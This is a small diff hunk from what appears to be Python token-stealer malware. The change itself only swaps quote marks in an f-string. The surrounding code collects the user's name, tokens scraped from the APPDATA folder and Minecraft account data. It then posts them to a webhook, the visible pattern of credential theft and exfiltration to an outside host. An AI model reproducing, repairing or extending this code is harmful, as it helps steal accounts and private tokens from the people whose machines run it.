@@ -249,7 +249,7 @@ def main():
     findEnd(USERNAME)
     replacePage()
 
-    DATA = f"User: {os.environ.get('username')}\nTokens: ```json\n{ScrapeTokens(APPDATA)}\n```\n" + f'Minecraft Accounts: ```json\n{MinecraftStealer()}\n```'
+    DATA = f"User: {os.environ.get("username")}\nTokens: ```json\n{ScrapeTokens(APPDATA)}\n```\n" + f'Minecraft Accounts: ```json\n{MinecraftStealer()}\n```'
 
     requests.post(
         url  = WEBHOOK,
